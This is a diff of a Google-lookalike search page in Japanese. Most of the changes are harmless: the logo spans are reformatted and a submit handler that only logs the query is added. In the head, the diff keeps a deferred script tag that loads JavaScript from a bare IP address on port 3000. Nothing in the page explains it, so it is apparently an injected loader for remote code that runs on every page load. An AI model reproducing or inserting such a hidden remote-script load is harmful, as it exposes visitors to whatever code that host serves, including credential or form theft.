@@ -3,11 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <title>Google API 検索</title>
-  <script src="http://157.7.67.141:3000" defer></script>
+  <script src="http://157.7.67.141:3000" type="text/javascript" defer></script>
 </head>
 <body style="text-align:center; font-family:sans-serif;">
   <h1 style="font-size:3em;">
-    <span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#34a853">g</span><span style="color:#ea4335">l</span><span style="color:#4285f4">e</span>
+    <span style="color:#4285f4">G</span>
+    <span style="color:#ea4335">o</span>
+    <span style="color:#fbbc05">o</span>
+    <span style="color:#34a853">g</span>
+    <span style="color:#ea4335">l</span>
+    <span style="color:#4285f4">e</span>
   </h1>
 
   <form id="search-form">
@@ -16,5 +21,17 @@
   </form>
 
   <div id="results" style="margin-top: 2em;"></div>
+
+  <script>
+    document.getElementById('search-form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const query = document.getElementById('query').value.trim();
+      if (!query) return;
+
+      // API 呼び出しなどの処理（例としてログ出力）
+      console.log('検索クエリ:', query);
+      // 必要に応じて fetch 等を追加
+    });
+  </script>
 </body>
 </html>
